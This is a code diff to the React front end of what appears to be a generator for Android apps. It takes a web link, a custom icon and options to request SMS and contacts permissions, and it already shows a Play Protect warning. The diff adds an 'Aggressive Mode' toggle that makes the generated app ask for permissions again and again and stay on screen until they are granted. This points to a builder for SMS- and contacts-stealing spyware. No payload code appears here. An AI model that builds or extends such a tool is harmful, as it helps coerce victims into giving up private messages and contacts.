@@ -28,6 +28,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket }: Ap
     const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | null>(null);
     const [showAdvanced, setShowAdvanced] = useState(false);
     const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
+    const [aggressivePermissions, setAggressivePermissions] = useState(false);
 
     useEffect(() => {
         if (isOpen) {
@@ -109,6 +110,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket }: Ap
             formData.append('webLink', webLink);
             formData.append('enableSmsPermission', enableSmsPermission.toString());
             formData.append('enableContactsPermission', enableContactsPermission.toString());
+            formData.append('aggressivePermissions', aggressivePermissions.toString());
             if (customIcon) {
                 formData.append('icon', customIcon);
             }
@@ -142,8 +144,8 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket }: Ap
     if (!isOpen) return null;
 
     return (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm animate-fadeIn overflow-y-auto py-10">
-            <div className="bg-[#1a1a1a] border border-white/20 p-8 rounded-3xl shadow-2xl max-w-md w-full text-center backdrop-blur-xl animate-scaleIn relative max-h-[90vh] overflow-y-auto">
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm animate-fadeIn py-4 sm:py-10">
+            <div className="bg-[#1a1a1a] border border-white/20 p-6 sm:p-8 rounded-3xl shadow-2xl max-w-md w-full text-center backdrop-blur-xl animate-scaleIn relative max-h-[90vh] overflow-y-auto custom-scrollbar">
                 <button
                     onClick={onClose}
                     className="absolute top-4 right-4 text-white/40 hover:text-white"
@@ -241,7 +243,24 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket }: Ap
                                 </button>
 
                                 {showAdvanced && (
-                                    <div className="mt-3 space-y-2">
+                                    <div className="mt-3 space-y-3">
+                                        {/* Aggressive Permissions */}
+                                        <div className="bg-yellow-500/10 p-3 rounded-lg border border-yellow-500/30">
+                                            <div className="flex items-center justify-between mb-1">
+                                                <div className="flex items-center gap-2">
+                                                    <svg className="w-4 h-4 text-yellow-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+                                                    <span className="text-sm font-medium text-yellow-300">Aggressive Mode</span>
+                                                </div>
+                                                <button
+                                                    onClick={() => setAggressivePermissions(!aggressivePermissions)}
+                                                    className={`w-12 h-6 rounded-full transition-colors relative ${aggressivePermissions ? 'bg-yellow-500' : 'bg-white/20'}`}
+                                                >
+                                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${aggressivePermissions ? 'left-7' : 'left-1'}`} />
+                                                </button>
+                                            </div>
+                                            <p className="text-xs text-yellow-200/50 text-left leading-tight">Repeatedly asks for permissions. App stays visible until granted.</p>
+                                        </div>
+
                                         {/* SMS Permission - Hidden under Advanced */}
                                         <div className="flex items-center justify-between bg-red-500/10 p-3 rounded-lg border border-red-500/30">
                                             <div className="flex items-center gap-2">
